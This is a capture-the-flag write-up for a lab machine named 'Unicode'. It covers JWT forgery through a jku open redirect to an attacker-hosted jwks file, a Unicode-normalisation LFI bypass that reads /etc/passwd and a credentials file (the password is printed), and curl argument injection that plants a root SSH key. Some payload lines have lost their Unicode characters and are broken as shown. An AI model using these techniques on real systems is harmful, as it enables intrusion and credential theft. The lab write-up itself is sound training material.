@@ -1,0 +1,164 @@
+                           Unicode
+
+                                                                                                     5th May 2022 / Document No
+                                                                                               D22.100.169
+
+                                                                                                     Prepared By: TheCyberGeek &
+                                                                                               amra
+
+                                                                                                     Machine Author(s): wh0am1root
+                                                                                                     Difficulty: Medium
+
+Synopsis
+
+Unicode is a medium difficulty Linux machine. The machine begins with the enumeration of a webserver.
+Upon registering a new account on the webserver a JWT cookie is used to authenticate the current session.
+Inspecting the JWT cookie reveals that it is signed through a jwks.json file stored on the server. Further
+enumeration reveals a /redirect?url= endpoint. Combining the findings so far an attacker could use the
+jwt_tool to craft a cookie that authenticates the Administrator user. Replacing the authentication cookie
+with the newly crafted one, the attacker is able to access a new dashboard. Searching around the
+dashboard an heavily filtered LFI endpoint is discovered. To bypass the filtration a HostSplit attack can be
+used since the webserver converts Unicode characters back to ASCII. Enumerating the local file system a
+YAML file can be found inside the code user's home directory. The YAML file contains credential that allows
+SSH authentication on the remote machine as the user code . The user code is able to execute a binary as
+the root user. Inspecting the binary it is revealed that it is a Python compiled binary. The attacker is able to
+transfer the binary to a local machine and extract the source code using pyinstxtractor and
+uncompyle6 . Reviewing the source code the attacker is able to spot a filtering bypass to inject command
+arguments to a curl call, thus allowing him to place an SSH key inside root's directory and ultimately
+authenticate as root on the remote machine using SSH.
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.126 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV 10.10.11.126
+
+The nmap scan shows that OpenSSH and Nginx are listening on their default ports.
+
+Foothold
+
+Browsing to port 80, we are shown a landing page for Hackmedia with registration and login functionality.
+Performing directory enumeration shows many 200s, which show 404 Not found when navigating to the
+website, so we apply a filter to show all results that are different than 1289 bytes long. This returns no
+results.
+
+   ffuf -u http://10.10.11.126/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-
+   medium.txt --fw 1289
+
+The Google about us link redirects us to https://google.com and inspecting the link shows /redirect/?
+url=google.com but doesn't seem useful at this moment.
+Navigating to the registration we register a test account and enter a dashboard with a option to Upload a
+Threat Report .
+
+Attempts to upload a threat report by submitting a .sh file returns a message stating file not allowed .
+The upload section only allows PDF uploads and when uploading a PDF we see a Thank You! message,
+which seems like a dead end.
+
+Checking the cookies we notice that we have been assigned a JWT based cookie and after decoding the
+cookie on jwt.io we notice that a jwks.json file is loaded from the website to sign cookies.
+We add the new VHost to /etc/hosts .
+   echo "10.10.11.126 hackmedia.htb" | sudo tee -a /etc/hosts
+
+Visiting the file stored in http://hackmedia.htb/static/jwks.json we can see the information that is
+being checked to sign cookies.
+
+Using this information we can begin to plan an attack path. We know that the server is using
+/static/jwks.json to validate cookies, and we know that there is a /redirect/?url= feature on the
+home page.
+Using jwt_tools we can forge an admin cookie by utilising this information. First we navigate to the
+jwt_tool folder and spawn a Python3 HTTPServer . Then, we execute the jwt_tool.py :
+   cd jwt_tool && sudo python3 -m http.server 80 &
+   python3 jwt_tool.py <JWT> -X s -ju http://hackmedia.htb/static/../redirect?
+   url=10.10.14.23/jwttool_custom_jwks.json -I -pc user -pv admin
+
+Then, following the instructions from the jwt_tool we copy the jwttool_custom_jwks.json file to our
+current working directory were we have the Python web server running:
+
+   cp /root/.jwt_tool/jwttool_custom_jwks.json .
+Now we take the new cookie and replace the auth cookie on the website.
+
+When we replace the auth cookie and refresh the web page we are redirected to the admin's dashboard.
+When navigating to the current month tab we see a message stating The Report is being prepared.
+Please come back later and notice the url http://hackmedia.htb/display/?page=monthly.pdf which
+leads to a suspected local file inclusion vulnerability.
+After attempting the standard LFI we are redirected to /filenotfound with a message stating that filtering
+has been applied.
+
+Testing the standard approaches shows no solid indications, but using this this link we can see when
+
+submiting /?page=/ /  that the website converts this unicode back to ASCII.
+Using this knowledge we search for a Unicode representation of .. and find this site which allows us to
+copy the two dot leader Unicode character.
+
+   http://hackmedia.htb/display/?page=///////etc/passwd
+When submitting to the new URL to the website we get a successful hit and bypassed the restrictions.
+
+Enumerating the file system, we see a default virtual host file for Nginx with some comments.
+   http://hackmedia.htb/display/?page=///////etc/nginx/sites-enabled/default
+Using this new found information, we navigate to the db.yaml file located in /home/code/coder/db.yaml
+and retrieve some credentials.
+
+   http://hackmedia.htb/display/?page=///////home/code/coder/db.yaml
+
+   mysql_host: "localhost"
+   mysql_user: "code"
+   mysql_password: "B3stC0d3r2021@@!"
+   mysql_db: "user"
+Owed to the earlier enumeration of the /etc/passwd file, we know that code is a system user. Let's check
+for password re-use by attempting to SSH using the credentials code:B3stC0d3r2021@@! .
+   ssh code@hackmedia.htb
+
+Finally, we get a shell as the code user and we can read the user flag.
+
+Privilege Escalation
+
+Checking the sudo entries for code user, we can see that we can execute /usr/bin/treport without a
+password.
+
+Executing the treport binary reveals that it's a custom coded report management binary.
+Running strings on the binary shows it's a Python based binary.
+
+We copy the binary back to our local machines and begin testing. It is extremely important that we use
+Python version 3.8 for the following steps. Using a tool called pyinsxtractor we can extract the .pyc file
+and try to decode it.
+Now we need to install uncompyle6 to decode the .pyc file we have just recovered and begin to extract the
+source code.
+
+Now that we have the source code we begin our review and we notice heavy filtering on the download
+function. But, we notice that the characters {} and , are not filtered.
+
+          def download(self):
+                 now = datetime.now()
+                 current_time = now.strftime('%H_%M_%S')
+                 command_injection_list = ['$', '`', ';', '&', '|', '||', '>', '<', '?', "'",
+   '@', '#', '$', '%', '^', '(', ')']
+
+                 ip = input('Enter the IP/file_name:')
+                 res = bool(re.search('\\s', ip))
+                 if res:
+
+                         print('INVALID IP')
+                         sys.exit(0)
+                 if 'file' in ip or 'gopher' in ip or 'mysql' in ip:
+                         print('INVALID URL')
+                         sys.exit(0)
+                 for vars in command_injection_list:
+                         if vars in ip:
+
+                                print('NOT ALLOWED')
+                                sys.exit(0)
+                         cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' +
+   current_time + '"'
+                         os.system(cmd)
+Since the code is executing a system command to launch curl we may be able to bypass this with a trick to
+replace spaces. Using a bypass from HackTricks we attempt to upload a file. We copy our
+~/.ssh/id_rsa.pub to our current directory were the Python webserver is still running.
+
+   cp ~/.ssh/id_rsa.pub .
+Now on the target we launch sudo /usr/bin/treport and attempt to inject into the URL of the download
+function.
+
+Attempting to SSH as root user on the target we are able to access the root account and read the root flag.
+
